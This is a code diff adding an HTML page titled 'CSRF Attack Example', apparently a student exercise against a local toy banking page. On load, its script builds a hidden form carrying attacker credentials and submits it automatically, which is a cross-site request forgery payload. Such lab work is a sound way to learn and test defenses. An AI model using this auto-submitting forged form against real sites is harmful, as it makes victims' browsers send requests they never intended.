@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+    <script>
+        function performCSRFAttack() {
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'file:///C:/Users/coe8/Documents/Web%20Technology/BankApp4.html';
+
+            const username = document.createElement('input');
+            username.type = 'hidden';
+            username.name = 'username';
+            username.value = 'attacker';
+            form.appendChild(username);
+
+            const password = document.createElement('input');
+            password.type = 'hidden';
+            password.name = 'password';
+            password.value = 'password';
+            form.appendChild(password);
+
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
+        }
+
+        // Automatically perform the CSRF attack when the page loads
+        window.onload = performCSRFAttack;
+    </script>
+</body>
+</html>
